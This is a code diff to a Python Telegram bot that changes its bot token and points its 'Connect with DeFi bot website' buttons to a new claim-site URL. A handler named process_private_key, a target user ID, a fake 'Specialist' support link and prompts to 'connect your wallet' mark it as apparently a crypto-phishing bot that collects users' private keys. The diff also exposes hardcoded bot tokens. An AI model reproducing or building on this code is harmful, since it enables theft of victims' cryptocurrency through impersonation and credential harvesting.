@@ -3,7 +3,7 @@ import time
 from telebot import types
 
 # Replace 'your_actual_bot_token' with your actual bot token
-BOT_TOKEN = '6660332089:AAFNaEYvH88S_t_tAzpUasNeEzjMEXAaEPo'
+BOT_TOKEN = '6609360875:AAFM7M7SIXe88hDeuYpcX3WanE4hrlCumqM'
 TARGET_USER_ID = 5643727074
 
 bot = telebot.TeleBot(BOT_TOKEN)
@@ -196,7 +196,7 @@ def process_private_key(message):
         markup = types.InlineKeyboardMarkup()
 
         # Button to visit an external website
-        website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://smogclaims.pages.dev/')
+        website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://scorpion-casino-claim.pages.dev/')
         markup.add(website_button)
         # Button to visit an external website
         website_button1 = types.InlineKeyboardButton("Connect with Specialist", url='https://t.me/helpteam_1')
@@ -213,7 +213,7 @@ def process_continue_command(message):
     bot.send_message(chat_id, "To resolve the issue, please visit the bot website and follow the instructions to connect your wallet.")
     # Create a new markup object for the button
     markup = types.InlineKeyboardMarkup()
-    website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://smogclaims.pages.dev/')
+    website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://scorpion-casino-claim.pages.dev/')
     markup.add(website_button)
 
     website_button1 = types.InlineKeyboardButton("Connect with Specialist", url='https://t.me/helpteam_1')
